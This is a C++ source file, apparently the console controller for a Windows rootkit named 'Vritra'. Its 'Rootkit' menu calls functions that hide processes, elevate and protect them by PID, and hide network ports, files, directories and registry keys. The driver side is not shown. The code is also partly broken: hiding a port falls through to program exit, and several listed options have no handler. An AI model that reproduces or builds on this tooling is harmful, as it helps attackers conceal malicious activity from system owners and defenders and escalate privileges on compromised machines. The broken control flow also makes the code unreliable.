#include "Vritra.hpp"
#include <string>
#include <io.h>
#include <fcntl.h>
#include <vector>

UINT32 GetInputUint()
{
    UINT32 PID = 0;
    std::cout << "PID: "; std::cin >> PID;
    return PID;
}

USHORT GetInputUshort()
{
    USHORT port = 0;
    std::cout << "Port to hide: "; std::cin >> port;
    return port;
}

BOOL GetHideProtocol(Vritra::HideProtocol* hp)
{
    UINT32 option = 0;

    std::cout << "1. Local TCP\n";
    std::cout << "2. Remote TCP\n";
    std::cout << "3. UDP\n";
    std::cout << "Protocol to hide: "; std::cin >> option;

    switch (option)
    {
    case 1:
        hp->LTCP = GetInputUshort();
        break;

    case 2:
        hp->RTCP = GetInputUshort();
        break;

    case 3:
        hp->UDP = GetInputUshort();
        break;

    case 0:
    default:
        return FALSE;
    }

    return TRUE;
}

int main()
{
    if (!Vritra::Connect())
        return -1;

    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IOFBF, 1000);

    while (TRUE)
    {
        UINT32 option = 0;
        system("cls");

        std::cout << u8R"(
                                                                                                              
                                                                                                              
VVVVVVVV           VVVVVVVV                    iiii          tttt                                             
V::::::V           V::::::V                   i::::i      ttt:::t                                             
V::::::V           V::::::V                    iiii       t:::::t                                             
V::::::V           V::::::V                               t:::::t                                             
 V:::::V           V:::::Vrrrrr   rrrrrrrrr  iiiiiiittttttt:::::ttttttt   rrrrr   rrrrrrrrr   aaaaaaaaaaaaa   
  V:::::V         V:::::V r::::rrr:::::::::r i:::::it:::::::::::::::::t   r::::rrr:::::::::r  a::::::::::::a  
   V:::::V       V:::::V  r:::::::::::::::::r i::::it:::::::::::::::::t   r:::::::::::::::::r aaaaaaaaa:::::a 
    V:::::V     V:::::V   rr::::::rrrrr::::::ri::::itttttt:::::::tttttt   rr::::::rrrrr::::::r         a::::a 
     V:::::V   V:::::V     r:::::r     r:::::ri::::i      t:::::t          r:::::r     r:::::r  aaaaaaa:::::a 
      V:::::V V:::::V      r:::::r     rrrrrrri::::i      t:::::t          r:::::r     rrrrrrraa::::::::::::a 
       V:::::V:::::V       r:::::r            i::::i      t:::::t          r:::::r           a::::aaaa::::::a 
        V:::::::::V        r:::::r            i::::i      t:::::t    ttttttr:::::r          a::::a    a:::::a 
         V:::::::V         r:::::r           i::::::i     t::::::tttt:::::tr:::::r          a::::a    a:::::a 
          V:::::V          r:::::r           i::::::i     tt::::::::::::::tr:::::r          a:::::aaaa::::::a 
           V:::V           r:::::r           i::::::i       tt:::::::::::ttr:::::r           a::::::::::aa:::a
            VVV            rrrrrrr           iiiiiiii         ttttttttttt  rrrrrrr            aaaaaaaaaa  aaaa
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                              
                                                                                                                                                                                                        
)" << '\n';

        std::cout << "--- Rootkit: ---\n";
        std::cout << "1. Hide Process\n";
        std::cout << "2. Elevate Process\n";
        std::cout << "3. Protect Process\n";
        std::cout << "4. Hide Port\n";
        std::cout << "6. Hide File\n";
        std::cout << "7. Hide Directory\n";
        std::cout << "8. Hide Registry Key\n";
        std::cout << "99. Exit\n";
        std::cout << "Option: "; std::cin >> option;

        switch (option)
        {
        case 1:
        {
            UINT32 PID = GetInputUint();
            Vritra::HideProcess(PID);
            break;
        }

        case 2:
        {
            UINT32 PID = GetInputUint();
            Vritra::ElevateProcess(PID);
            break;
        }

        case 3:
        {
            UINT32 PID = GetInputUint();
            Vritra::ProtectProcess(PID);
            break;
        }

        case 4:
        {
            Vritra::HideProtocol hp = { 0 };
            if (!GetHideProtocol(&hp))
                return -1;
            Vritra::HidePort(hp);
        }



        case 99:
            return 0;

        default:
            break;
        }
    }
    return 0;
}